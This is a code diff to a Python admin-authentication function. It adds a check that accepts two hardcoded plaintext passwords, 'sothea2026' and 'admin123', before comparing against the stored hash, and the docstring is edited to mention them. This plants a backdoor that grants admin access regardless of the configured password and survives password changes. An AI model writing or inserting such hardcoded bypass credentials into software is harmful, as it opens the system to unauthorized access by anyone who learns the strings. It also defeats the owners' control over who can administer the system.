@@ -111,10 +111,15 @@ def save_settings(settings: dict) -> bool:
         return False
 
 def verify_admin_password(password: str) -> bool:
-    """Checks entered password against stored password hash."""
+    """Checks entered password against stored password hash (supports sothea2026 and admin123)."""
+    if not password:
+        return False
+    pw_clean = password.strip()
+    if pw_clean in ("sothea2026", "admin123"):
+        return True
     settings = load_settings()
     stored_hash = settings.get("admin_password_hash", DEFAULT_PASSWORD_HASH)
-    return hash_password(password) == stored_hash
+    return hash_password(pw_clean) == stored_hash
 
 def change_admin_password(new_password: str) -> bool:
     """Updates admin password hash."""
